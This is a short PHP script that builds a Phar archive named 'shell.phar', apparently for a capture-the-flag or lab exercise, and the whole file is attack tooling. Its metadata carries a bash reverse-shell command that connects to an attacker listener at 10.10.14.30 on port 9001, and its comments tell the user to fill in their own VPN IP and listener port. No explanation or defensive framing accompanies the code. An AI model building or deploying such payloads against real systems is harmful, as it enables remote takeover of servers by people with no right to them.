<?php
// build_phar.php
$pharFile = "shell.phar";
@unlink($pharFile); // remove if exists

$phar = new Phar($pharFile);
$phar->startBuffering();

// Minimal stub
$phar->setStub('<?php __HALT_COMPILER(); ?>');

// Add a dummy file (required by Phar)
$phar->addFromString("test.txt", "test");

// Reverse shell payload in metadata
$ip = "10.10.14.30";   // your VPN IP
$port = "9001";        // your listener port

$phar->setMetadata([
    "cmd" => "/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
]);

$phar->stopBuffering();

echo "Phar reverse shell created: $pharFile\n";
